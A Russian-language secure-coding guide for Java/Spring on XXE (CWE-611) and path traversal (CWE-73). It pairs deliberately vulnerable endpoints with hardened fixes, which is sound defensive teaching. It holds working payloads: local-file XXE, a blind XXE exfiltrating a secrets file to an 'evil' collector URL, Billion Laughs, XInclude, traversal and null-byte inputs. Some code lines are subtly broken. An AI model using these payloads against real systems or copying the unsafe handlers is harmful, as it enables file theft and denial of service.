# Примеры эксплуатации и устранения CWE в Java

## Запуск:
```cmd
```

Данное руководство поможет вам понять причины появления слабостей, их возможное влияние на приложение, а также способы их предотвращения в web – приложениях, разрабатываемых на языке Java с использованием Spring.

<!-- TOC -->
* [Примеры эксплуатации и устранения CWE в Java](#примеры-эксплуатации-и-устранения-cwe-в-java)
  * [1.	CWE-611: Improper Restriction of XML External Entity Reference](#1-cwe-611-improper-restriction-of-xml-external-entity-reference)
    * [1.1. Описание](#11-описание)
      * [1.1.1. XInclude](#111-xinclude)
    * [1.2. Защитные меры](#12-защитные-меры)
    * [1.3. Примеры](#13-примеры)
      * [*Пример 1. Небезопасный анмаршаллинг объекта из XML документа*](#пример-1-небезопасный-анмаршаллинг-объекта-из-xml-документа)
      * [*Пример 2. Безопасный анмаршаллинг объекта из XML документа*](#пример-2-безопасный-анмаршаллинг-объекта-из-xml-документа)
      * [*Пример 3. Безопасный парсинг при помощи javax.xml.parsers.DocumentBuilder*](#пример-3-безопасный-парсинг-при-помощи-javaxxmlparsersdocumentbuilder)
      * [*Пример 4. Безопасный парсинг при помощи org.dom4j.io.SAXReader*](#пример-4-безопасный-парсинг-при-помощи-orgdom4jiosaxreader)
<!-- TOC -->

## 1.	CWE-611: Improper Restriction of XML External Entity Reference

![cwe-611_1.png](readme_img/cwe-611_1.png)

### 1.1. Описание
Атака типа внедрение XML eXternal Entity (XXE) находится на 4 месте в топ-10 OWASP и представляет собой тип атаки на приложение, которое анализирует XML.
Эта атака происходит, когда ненадежный XML, содержащий ссылку на внешний объект, обрабатывается плохо настроенным синтаксическим анализатором XML.
Атака может привести к раскрытию конфиденциальных данных, отказу в обслуживании, подделке запросов на стороне сервера (SSRF), сканированию портов с точки зрения машины, на которой расположен анализатор, и другим системным воздействиям.
Подробнее о типах атак можно прочитать на https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/xxe-xee-xml-external-entity.md
Типы сценариев XXE (различные типы сценариев, с которыми вы можете столкнуться):
- XXE на основе ответа - когда внедренный запрос выдает данные в ответ.
- XXE на основе ошибок - когда нет ответа от объектов XML, но мы можем просмотреть ответ, вызвав ошибки.
- Слепой XXE - когда нет ни ошибки, ни ответа, но XML анализируется на стороне сервера.

Пример: программа парсит XML – файл и возвращает результат пользователю. Создадим XML и добавим туда внешнюю сущность <!ENTITY xxe SYSTEM "file:///c:/temp/secrets.txt" > (URI, указывающий на локальный файл):


```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user [
        <!ENTITY xxe SYSTEM "file:///c:/temp/secrets.txt" >
                ]>
<user id="ec77d4a3-156a-4464-bc9e-ed9835661b75">
    <username>&xxe;</username>
    <password>7815696ecbf1c96e6894b779456d330e</password>
    <group>Users</group>
    <email>zx</email>
</user>
```

При парсинге XML с помощью популярных Java – парсеров, содержимое (строка «XXE injection example») файла
c:/temp/secrets.txt подставляется внутрь тэга username:

![cwe-611_2.png](readme_img/cwe-611_2.png)

XML – парсер может получить доступ к любому файлу на сервере, если к этому файлу имеет доступ учетная запись, от имени которой запущено приложение.
Пример использования внешней сущности для слепого извлечения файлов путем перенаправления вывода на контролируемый сервер:
XML – документ:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % pe SYSTEM "http://localhost:7171/evil/xxe-file"> %pe; %param1; ]>
<foo>&external;</foo>
```
Содержимое файла xxe_file:
```xml
<!ENTITY % payload SYSTEM "file:///c:/temp/secrets.txt">
<!ENTITY % param1 "<!ENTITY external SYSTEM 'http://localhost:7171/evil/log-data?data=%payload;'>">
```
Лог на сервере злоумышленника:

![cwe-611_3.png](readme_img/cwe-611_3.png)

Самый безопасный способ предотвратить появление XXE - это всегда полностью отключать поддержку DTD и внешних сущностей.
Отключение поддержки DTD и внешних сущностей также обеспечивает защиту парсера от атак типа "отказ в обслуживании" (DOS), таких как Billion Laughs:

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
        <!ENTITY lol "lol">
        <!ELEMENT lolz (#PCDATA)>
        <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
        <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
        <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
        <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
        <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
        <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
        <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
        <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
        <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
        ]>
<lolz>&lol9;</lolz>
```
\* некоторые современные XML – парсеры содержат защиту от данного вида атаки по умолчанию. Например, в org.w3c.dom.Document ограничение на количество сущностей – 64 000. Но даже с таким ограничением возможно сформировать XML документ размером более 40 МБ, чего достаточно для проведения атаки типа DDoS в случае одновременной отправки большого количества запросов:

![cwe-611_4.png](readme_img/cwe-611_4.png)

#### 1.1.1. XInclude
Некоторые приложения получают данные, переданные клиентом, вставляют их на стороне сервера в XML-документ, а затем разбирают этот документ. Примером может служить ситуация, когда переданные клиентом данные помещаются в внутренний SOAP-запрос, который затем обрабатывается внутренним SOAP-сервисом.
В этой ситуации вы не сможете провести классическую XXE-атаку, потому что вы не контролируете весь XML-документ и поэтому не можете определить или изменить элемент DOCTYPE. Однако вместо этого вы можете использовать XInclude. XInclude - это часть спецификации XML, которая позволяет создавать XML-документ из поддокументов. Вы можете поместить XInclude в любое значение данных в XML-документе, поэтому атака может быть выполнена в ситуациях, когда вы контролируете только один элемент данных, помещенный в XML-документ на стороне сервера.
Чтобы выполнить атаку XInclude, нужно обратиться к пространству имен XInclude и указать путь к файлу, который вы хотите включить. Например:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="jar:file:///c:/temp/secrets.zip!/secrets.txt"/></foo>
```

### 1.2. Защитные меры
Единственным надежным способом предотвращения XXE является отключение поддержки DTD и внешних сущностей при обработке XML документа.
Для классов DocumentBuilderFactory, SAXParserFactory, XMLInputFactory (StAX parser) и других, отключение поддержки DTD и внешних сущностей осуществляется с помощью метода setFeature, например:

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// This is the PRIMARY defense. If DTDs (doctypes) are disallowed, almost all
// XML entity attacks are prevented
// Xerces 2 only - http://xerces.apache.org/xerces2-j/features.html#disallow-doctype-decl
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
// and these as well, per Timothy Morgan's 2014 paper: "XML Schema, DTD, and Entity Attacks"
dbf.setXIncludeAware(false);
```
```java
SAXParserFactory factory = SAXParserFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```
```java
XMLInputFactory xmlInputFactory = XMLInputFactory.newInstance();
xmlInputFactory.setProperty(""javax.xml.stream.isSupportingExternalEntities", false)
```
Данному виду атаки подвержены многие классы Java, а также некоторые версии Spring OXM и Spring MVC:
-	JAXP DocumentBuilderFactory, SAXParserFactory and DOM4J
-	XMLInputFactory (a StAX parser)
-	Oracle DOM Parser
-	TransformerFactory
-	Validator
-	SchemaFactory
-	SAXTransformerFactory
-	XMLReader
-	SAXReader
-	SAXBuilder
-	No-op EntityResolver
-	JAXB Unmarshaller
-	XPathExpression
-	java.beans.XMLDecoder

Для снижения вероятности реализации CWE-611 следуйте следующим рекомендациям:
1.	Старайтесь всегда полностью отключать поддержку DTD, внешних сущностей и XInclude;
2.	Не доверяйте XML, полученным из внешних источников и данным, вводимым пользователем;
3.	Проверяйте вводимые пользователем данные. Отклоняйте данные, /фильтруйте/избегайте, если возможно.

Примеры корректного отключения поддержки DTD и внешних сущностей для различных XML парсеров представлены на странице https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html

### 1.3. Примеры
#### *Пример 1. Небезопасный анмаршаллинг объекта из XML документа*

```java
@PostMapping(value = "unmarshall-full-unsafe",
        consumes = MediaType.APPLICATION_XML_VALUE, produces = MediaType.TEXT_PLAIN_VALUE)
@ResponseStatus(HttpStatus.CREATED)
public void xxeFileUnmarshallUnsafe(@RequestBody String xml, HttpServletResponse response) throws JAXBException, IOException {
    // Необходимо только для демонстрации <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts" >
    // с сущностями типа "lol" работает по умолчанию
    System.setProperty("javax.xml.accessExternalDTD", "all");

    User user = JAXB.unmarshal(new StringReader(xml), User.class);
    response.getWriter().write(user.toString());
}
```

![cwe-611_5.png](readme_img/cwe-611_5.png)

#### *Пример 2. Безопасный анмаршаллинг объекта из XML документа*
В данном примере отключена поддержка DTD до начала процесса парсинга XML. При попытке эксплуатации XXE injection, на сервере выбрасывается исключение org.xml.sax.SAXParseException: DOCTYPE is disallowed when the feature "http://apache.org/xml/features/disallow-doctype-decl" set to true. А пользователю – ошибка 500 Internal Server Error.

```java
@PostMapping(value = "unmarshall-safe",
        consumes = MediaType.APPLICATION_XML_VALUE, produces = MediaType.TEXT_PLAIN_VALUE)
@ResponseStatus(HttpStatus.CREATED)
public void unmarshallSafe(@RequestBody String xml, HttpServletResponse response) throws IOException, SAXException, ParserConfigurationException {
    // Because javax.xml.bind.Unmarshaller parses XML but does not support any flags for disabling XXE, you must
    // parse the untrusted XML through a configurable secure parser first, generate a source object as a result,
    // and pass the source object to the Unmarshaller. For example:

    SAXParserFactory spf = SAXParserFactory.newInstance();

    //Option 1: This is the PRIMARY defense against XXE
    spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    spf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
    spf.setXIncludeAware(false);

    //Do unmarshall operation
    Source xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(),
            new InputSource(new StringReader(xml)));
    User user = JAXB.unmarshal(xmlSource, User.class);
    response.getWriter().write(user.toString());
}
```

#### *Пример 3. Безопасный парсинг при помощи javax.xml.parsers.DocumentBuilder*

```java
@PostMapping(value = "domparse-safe",
        consumes = MediaType.APPLICATION_XML_VALUE, produces = MediaType.TEXT_PLAIN_VALUE)
@ResponseStatus(HttpStatus.CREATED)
public void domParseSafe(@RequestBody String xml, HttpServletResponse response) throws ParserConfigurationException, IOException, SAXException {
    Users users = new Users();
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

    // This is the PRIMARY defense. If DTDs (doctypes) are disallowed, almost all
    // XML entity attacks are prevented
    // Xerces 2 only - http://xerces.apache.org/xerces2-j/features.html#disallow-doctype-decl
    dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    // and these as well, per Timothy Morgan's 2014 paper: "XML Schema, DTD, and Entity Attacks"
    dbf.setXIncludeAware(false);

    DocumentBuilder builder = dbf.newDocumentBuilder();
    Document document = builder.parse(new InputSource(new StringReader(xml)));
    document.getDocumentElement().normalize();
    NodeList nodeList = document.getElementsByTagName("user");
    for (int i = 0; i < nodeList.getLength(); i++) {
        Node node = nodeList.item(i);
        if (node.getNodeType() == Node.ELEMENT_NODE) {
            Element element = (Element) node;
            User user = new User(
                    element.getElementsByTagName("username").item(0).getTextContent(),
                    element.getElementsByTagName("password").item(0).getTextContent(),
                    element.getElementsByTagName("group").item(0).getTextContent(),
                    UUID.fromString(element.getAttribute("id")),
                    element.getElementsByTagName("email").item(0).getTextContent());
            users.addUser(user);
        }
    }
    response.getWriter().write(users.toString());
}
```

#### *Пример 4. Безопасный парсинг при помощи org.dom4j.io.SAXReader*

```java
@PostMapping(value = "saxparse-safe",
        consumes = MediaType.APPLICATION_XML_VALUE, produces = MediaType.TEXT_PLAIN_VALUE)
@ResponseStatus(HttpStatus.CREATED)
public void saxParseSafe(@RequestBody String xml, HttpServletResponse response) throws ParserConfigurationException, IOException, SAXException, DocumentException {
    // To protect a Java org.dom4j.io.SAXReader from an XXE attack, do this:
    SAXReader saxReader = new SAXReader();
    saxReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    saxReader.setFeature("http://xml.org/sax/features/external-general-entities", false);
    saxReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

    org.dom4j.Document document = saxReader.read(new InputSource(new StringReader(xml)));
    response.getWriter().write(document.asXML());
}
```

## 2.	CWE-73: External Control of File Name or Path
### 2.1. Описание

![cwe-73_1.png](readme_img/cwe-73_1.png)
 
Данная слабость возникает в случае, если приложение позволяет пользовательскому вводу контролировать или влиять на пути или имена файлов, используемые в операциях с файловой системой. Это может позволить злоумышленнику получить доступ или изменить системные файлы или другие файлы, критичные для приложения.
Одним из примеров атаки с использованием данной слабости является Path Traversal.
Как правило, такие атаки предполагают использование dot-dot-slash (('..\' или '../')) последовательностей (relative path traversal) или абсолютных путей вместо относительных (absolute path traversal). Для защиты необходимо применять различные способы валидации данных, получаемых от пользователя. Как правило, path traversal атаки, известные также как directory traversal, позволяют злоумышленнику работать с файлами и папками, к которым в обычном случае у него не должно быть доступа.
Например, возьмем контроллер для скачивания изображений. Путь к файлу формируется при помощи конкатенации "c:\temp\" и имени файла, поступившего из GET-запроса:

```java
static final String BASE_DIRECTORY = "c:\\temp\\";

@GetMapping("download-image-unsafe")
public void downloadImageUnsafe(@RequestParam("filename") String fileName, HttpServletResponse response) throws IOException {

    File f = new File(BASE_DIRECTORY + fileName);

    if (f.exists() && !f.isDirectory()) {

        MediaType mediaType = MediaTypeFactory.getMediaType(fileName)
                .orElse(MediaType.APPLICATION_OCTET_STREAM);

        response.setContentType(mediaType.toString());
        response.setHeader("Content-Disposition", "attachment; filename=" + f.getName());

        response.getOutputStream()
                .write(("Resolved file name: " + f + "\n" + "Canonical pathname: "
                        + f.getCanonicalPath() + "\n\n").getBytes());
        response.getOutputStream().write(Files.readAllBytes(f.toPath()));
    } else {
        response.setStatus(HttpServletResponse.SC_NOT_FOUND);
        response.getWriter().write("File doesn't exist or is not a file.");
    }
}
```

Передав в качестве параметра `filename=/../windows/system32/drivers/etc/hosts` мы смогли выйти за пределы каталога `c:\temp\`, поднявшись сначала на уровень выше, а потом попали в каталог `C:\Windows\System32\drivers\etc\` и скачали файл `hosts`:

![cwe-73_2.png](readme_img/cwe-73_2.png)

Влияние от атаки можно значительно уменьшить, если после пользовательского ввода добавлять некоторый текст, например:

```java
File picture = new File(BASE_DIRECTORY + fileName + ".jpeg");
```

Или проверив имя переданного в GET-запросе параметра:

```java
if (fileName.endsWith(".jpg")) {
    File picture = new File(fileName);
}
```

В таком случае за пределы каталога все равно можно выйти, но прочитать получится только файл с расширением jpg.

#### "Null Byte Injection" или "Null Byte Poisoning"

> Важно:
Данный способ «смягчения» последствий крайне не рекомендуется использовать в качестве основной защиты от атаки типа path traversal, т.к. в старых версиях Java возможна инъекция Null Byte:
Инъекция нулевого байта - это активная техника эксплуатации, используемая для обхода фильтров проверки целостности веб-инфраструктуры путем добавления в пользовательские данные символов нулевого байта, закодированных в URL (т.е. %00 или 0x00 в шестнадцатеричном формате). Нулевой байт представляет собой точку окончания строки или символ-разделитель, который означает немедленное прекращение обработки строки. Байты, следующие за разделителем, игнорируются. Такая инъекция может изменить логику работы приложения и позволить злоумышленнику получить несанкционированный доступ к системным файлам.
Например, проверку расширения файла можно обойти, используя ввод вида secret.txt%00.jpg
Инъекция нулевого байта в именах файлов была исправлена в Java начиная с версии jdk 7u40 b28
Подробнее:
>
> http://projects.webappsec.org/w/page/13246949/Null-Byte-Injection
> 
> https://portswigger.net/blog/null-byte-attacks-are-alive-and-well
> 
> https://bugs.java.com/bugdatabase/view_bug.do?bug_id=8014846

### 2.2. Защитные меры
Для предотвращения CWE-73 необходимо выполнять следующие рекомендации:
1. Избегайте использования пользовательского ввода непосредственно в функциях, работающих с файлами;
2. Выполняйте очистку и фильтрацию пользовательского ввода;
3. Проверяйте результирующий путь перед выполнением операций чтения и записи;
4. Для загрузки ресурсов используйте загрузчик класса, который может загружать файлы только из Classpath, например, `Class.getClassLoader().getResource()`, `Class.getResource()`, или `org.springframework.core.io.ResourceLoader`.

### 2.3. Примеры
#### *Пример 1. Небезопасное составление имени файла*
Путь к файлу формируется при помощи конкатенации `c:\temp\` и имени файла, поступившего из GET-запроса.

```java
static final String BASE_DIRECTORY = "c:\\temp\\";

@GetMapping("download-image-unsafe")
public void downloadImageUnsafe(@RequestParam("filename") String fileName, HttpServletResponse response) throws IOException {

    File f = new File(BASE_DIRECTORY + fileName);

    if (f.exists() && !f.isDirectory()) {

        MediaType mediaType = MediaTypeFactory.getMediaType(fileName)
                .orElse(MediaType.APPLICATION_OCTET_STREAM);

        response.setContentType(mediaType.toString());
        response.setHeader("Content-Disposition", "attachment; filename=" + f.getName());

        response.getOutputStream()
                .write(("Resolved file name: " + f + "\n" + "Canonical pathname: "
                        + f.getCanonicalPath() + "\n\n").getBytes());
        response.getOutputStream().write(Files.readAllBytes(f.toPath()));
    } else {
        response.setStatus(HttpServletResponse.SC_NOT_FOUND);
        response.getWriter().write("File doesn't exist or is not a file.");
    }
}
```

#### *Пример 2. Небезопасное составление имени файла*
Путь к сохраняемому файлу формируется при помощи конкатенации пути к папке temp и имени файла (`file.getOriginalFilename()`), поступившего в POST-запросе.

```java
@PostMapping("upload-image-unsafe")
public ResponseEntity<?> uploadImageUnsafe(@RequestParam("file") MultipartFile file) {
    if (file == null) return ResponseEntity.status(HttpStatus.I_AM_A_TEAPOT).body("File missing");
    try {
        String requestFileName = file.getOriginalFilename();
        File resultFile = new File(System.getProperty("java.io.tmpdir") + requestFileName);

        file.transferTo(resultFile);

        String result = String.format("%s\tFile with requestFileName %s transferred to %s (resultPath: %s)"
                , new Date(), requestFileName, resultFile, resultFile.getCanonicalPath());

        return ResponseEntity.ok().body(result);
    } catch (IOException e) {
        e.printStackTrace();
        return ResponseEntity.internalServerError().body(e.getMessage());
    }
}
```

Сформировав POST запрос вручную, можно подделать название файла, чтобы сохранить его в любое доступное для записи место:

![cwe-73_3.png](readme_img/cwe-73_3.png)

#### *Пример 3. Небезопасное составление имени файла*
descartes-xsd-validation-ext - XsdController.java

```java
@PostMapping("upload")
public XsdResponse upload(@RequestParam("file") MultipartFile file,
                               RedirectAttributes redirectAttributes) {

    File copied = new File(System.getProperty("java.io.tmpdir") + "/" + file.getOriginalFilename());
    XsdResponse response;

    try {
        FileUtils.copyInputStreamToFile(file.getInputStream(), copied);
```

#### *Пример 4. Безопасное составление имени файла: нормализация и проверка результирующей директории*

```java
public static final String BASE_DIRECTORY = "/var/www/images/";

public void downloadFile(String fileName) throws IOException {

    File file = new File(BASE_DIRECTORY, fileName);
    if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
        // process file
        doSomething();
    } else
        throw new RuntimeException(String.format("Не валидное имя файла. %s", fileName));
}
```

#### *Пример 5. Безопасное составление имени файла: нормализация и проверка результирующей директории*

```java
static final String BASE_DIRECTORY = "c:\\temp\\";

@GetMapping("download-image-safe")
public void downloadImageSafe(@RequestParam("filename") String fileName, HttpServletResponse response) throws IOException {

    File f = new File(BASE_DIRECTORY + fileName);

    if (!f.getCanonicalPath().toLowerCase().startsWith(BASE_DIRECTORY)
            || (!f.exists() && f.isDirectory())) {
        response.setStatus(HttpServletResponse.SC_NOT_FOUND);
        response.getWriter().write("File doesn't exist or is not a file.");
    } else {
        MediaType mediaType = MediaTypeFactory.getMediaType(fileName)
                .orElse(MediaType.APPLICATION_OCTET_STREAM);
        response.setContentType(mediaType.toString());
        response.setHeader("Content-Disposition", "attachment; filename=" + f.getName());
response.getOutputStream()
        .write(("Resolved file name: " + f + "\n" + "Canonical pathname: "
                + f.getCanonicalPath() + "\n\n").getBytes());
        response.getOutputStream().write(Files.readAllBytes(f.toPath()));
    }
}
```

### *Пример 6. Безопасное составление имени файла: проверка регулярным выражением и очистка от «..»*

```java
static boolean checkFileName(final String fileName) {
    final String pattern = "^[A-Za-z0-9.\\-\\_]{1,255}$";
    return fileName.matches(pattern);
}

@PostMapping("upload")
public XsdResponse upload(@RequestParam("file") MultipartFile file, RedirectAttributes redirectAttributes) {
    String fileName = file.getOriginalFilename();
    if (fileName == null) {
        throw new RuntimeException(String.format("Отсутсвует имя файла."));
    }
    if (!checkFileName(fileName)) {
        throw new RuntimeException(String.format("Не валидное имя файла. %s", fileName));
    }
    fileName = fileName.replaceAll("\\.\\.", "");
    File copied = new File(System.getProperty("java.io.tmpdir") + "/" + fileName);
```

Еще больше примеров неправильного и правильного написания кода:
https://community.veracode.com/s/article/how-do-i-fix-cwe-73-external-control-of-file-name-or-path-in-java

Подробней о CWE:
* https://owasp.org/www-community/attacks/Path_Traversal
* https://portswigger.net/web-security/file-path-traversal
* https://learn.snyk.io/lesson/directory-traversal/

